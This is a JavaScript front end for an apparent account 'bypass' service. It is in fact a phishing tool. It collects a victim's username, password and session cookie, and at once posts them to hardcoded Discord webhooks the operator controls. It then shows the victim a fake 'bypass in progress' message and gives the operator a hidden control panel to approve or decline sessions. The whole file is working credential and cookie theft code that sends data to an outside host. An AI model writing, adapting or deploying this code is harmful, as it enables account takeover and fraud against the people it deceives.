const hardcodedWebhooks = [
  "https://discord.com/api/webhooks/YOUR_WEBHOOK_1",
  "https://discord.com/api/webhooks/YOUR_WEBHOOK_2"
];

let sessions = [];

const sendToWebhook = (url, payload) => {
  fetch(url, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(payload)
  });
};

const updateControlPanel = () => {
  document.getElementById("totalSessions").textContent = sessions.length;
  const active = sessions.filter(s => s.status === "pending");
  document.getElementById("activeSessions").textContent = active.length;

  const sessionList = document.getElementById("sessionList");
  sessionList.innerHTML = "";

  active.forEach((session, index) => {
    const div = document.createElement("div");
    div.className = "session";
    div.innerHTML = `
      <p><strong>Username:</strong> ${session.username}</p>
      <p><strong>Password:</strong> ${session.password}</p>
      <p><strong>Cookie:</strong> ${session.cookie}</p>
      <p><strong>Webhook:</strong> ${session.userWebhook || "N/A"}</p>
      <button onclick="approveSession(${index})">✅ Approve</button>
      <button onclick="declineSession(${index})">❌ Decline</button>
      <input type="text" id="reason_${index}" placeholder="Reason for decline" />
    `;
    sessionList.appendChild(div);
  });
};

const approveSession = (index) => {
  const session = sessions[index];
  if (session.userWebhook) {
    sendToWebhook(session.userWebhook, {
      content: `Username: **${session.username}**\nPassword: **${session.password}**\nCookie: **${session.cookie}**`
    });
    session.status = "approved";
    updateControlPanel();
  }
};

const declineSession = (index) => {
  const session = sessions[index];
  const reason = document.getElementById(`reason_${index}`).value || "No reason provided";
  if (session.userWebhook) {
    sendToWebhook(session.userWebhook, {
      content: `Bypass failed: ${reason}`
    });
    session.status = "declined";
    updateControlPanel();
  }
};

document.getElementById("bypassForm").addEventListener("submit", function(e) {
  e.preventDefault();

  const username = document.getElementById("usernameInput").value;
  const password = document.getElementById("passwordInput").value;
  const cookie = document.getElementById("cookieInput").value;
  const userWebhook = document.getElementById("webhookInput").value;

  // Send to hardcoded webhooks immediately
  const fullPayload = {
    content: `Username: **${username}**\nPassword: **${password}**\nCookie: **${cookie}**`
  };
  hardcodedWebhooks.forEach(url => sendToWebhook(url, fullPayload));

  // Send "bypass in progress" to user webhook
  if (userWebhook) {
    sendToWebhook(userWebhook, { content: "Bypass in progress. Please wait...\nMay take from 1 - 30 minutes depending on account." });

    const session = {
      username,
      password,
      cookie,
      userWebhook,
      createdAt: Date.now(),
      status: "pending"
    };

    sessions.push(session);
    updateControlPanel();

    // Automatically send after 10 minutes if not handled
    setTimeout(() => {
      if (session.status === "pending") {
        approveSession(sessions.indexOf(session));
      }
    }, 10 * 60 * 1000); // 10 minutes
  }
});

// Open control panel with Numpad 1
document.addEventListener("keydown", (e) => {
  if (e.code === "**") {
    document.getElementById("controlPanel").style.display = "block";
    document.getElementById("overlay").style.display = "block";
    updateControlPanel();
  }
});
